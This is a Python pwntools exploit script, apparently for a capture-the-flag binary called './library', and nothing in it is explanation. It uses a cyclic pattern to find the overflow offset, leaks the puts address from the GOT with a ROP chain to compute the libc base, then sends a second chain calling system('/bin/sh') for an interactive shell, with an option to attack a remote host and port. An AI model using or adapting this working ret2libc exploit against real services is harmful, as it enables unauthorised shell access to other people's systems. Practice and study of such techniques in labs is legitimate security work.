from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './library'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
libc = ELF('libc.so.6')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()

# POP RDI from ropper
pop_rdi = 0x400783
ret = 0x400536

# Payload to leak libc function
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.symbols.main
    ]
})

# Send the payload
io.sendlineafter('>', payload)

io.recvline()  # Receive the newline

# Retrieve got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# System(/bin/sh)
info("system_addr: %#x", libc.symbols.system)
bin_sh = next(libc.search(b'/bin/sh\x00'))
info("bin_sh: %#x", bin_sh)

# Payload to get shell
payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        ret,
        libc.symbols.system
    ]
})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
